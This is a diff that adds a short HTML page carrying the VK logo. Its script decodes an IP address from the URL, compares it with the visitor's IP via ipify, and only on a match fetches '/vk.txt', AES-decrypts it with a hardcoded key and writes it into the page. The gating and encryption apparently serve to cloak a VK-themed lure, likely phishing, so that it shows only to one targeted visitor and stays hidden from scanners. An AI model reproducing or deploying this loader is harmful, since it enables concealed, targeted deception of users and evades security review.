@@ -1,0 +1,24 @@
+<script src="https://ummx.github.io/import/script/aes.js"></script>
+
+
+<script>
+    var ipd = atob(location.search.slice(1).split("&")[0].split("=")[1])
+
+    fetch("https://api.ipify.org/?format=json")
+    .then((response)=>{
+        return response.json()
+    })
+    .then((data)=>{
+       if(ipd == data.ip){
+           fetch('/vk.txt')
+           .then((r)=>{
+               return r.text()
+           })
+           .then((d)=>{
+               document.write(decrypt(d,'3301'))
+           })
+       }
+    })
+</script>
+
+<img style="width:100px;display: block;margin: auto;text-align: center;margin-top:150px;" src="https://upload.wikimedia.org/wikipedia/commons/2/21/VK.com-logo.svg" alt="">
